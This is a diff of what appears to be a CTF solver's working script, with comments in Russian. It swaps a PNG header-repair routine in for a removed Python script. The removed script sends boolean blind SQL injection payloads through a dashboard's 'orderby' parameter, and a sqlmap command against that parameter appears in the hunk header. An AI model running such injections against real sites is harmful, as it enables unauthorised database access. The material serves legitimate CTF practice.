@@ -242,21 +242,19 @@ sqlmap -u "http://example.com/dashboard.php?orderby=submission_time&order=DESC" 
 
 
 
-import requests
+with open('chall.png', 'rb') as f:
+    data = f.read()
 
-URL = "http://dalctf-secureform-admin-39-64616c.instancer.dalctf2026.com/dashboard.php"
-COOKIES = {"PHPSESSID": "3c5eea0be8d5d22f877f0d069b71e549"} # Убедись, что кука актуальна!
+# Правильный заголовок PNG (магические байты + длина первого чанка 13 + имя IHDR)
+png_header = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0DIHDR'
 
-def check(payload):
-    params = {"orderby": payload, "order": "ASC"}
-    resp = requests.get(URL, params=params, cookies=COOKIES)
-    # Если в ответе "asdasd" идет после "sfdqwef" (сортировка по имени) -> ИСТИНА
-    # Если наоборот -> ЛОЖЬ
-    return "sfdqwef" in resp.text.split("Position: 2")[0]
+# 1. Отрезаем первые 16 байт фальшивого JPEG и ставим чистый PNG-заголовок
+fixed_data = png_header + data[16:]
 
-# Проверяем наличие таблицы "users" или "flag"
-payload = "(CASE WHEN (select table_name from information_schema.tables where table_name='users')='users' THEN name ELSE id END)"
-if check(payload):
-    print("[+] Таблица 'users' существует!")
-else:
-    print("[-] Таблица 'users' не найдена.")
+# 2. Возвращаем оригинальные имена блокам данных
+fixed_data = fixed_data.replace(b'ISAD', b'IDAT')
+fixed_data = fixed_data.replace(b'SEND', b'IEND')
+
+# 3. Сохраняем починенную картинку
+with open('fixed.png', 'wb') as f:
+    f.write(fixed_data)
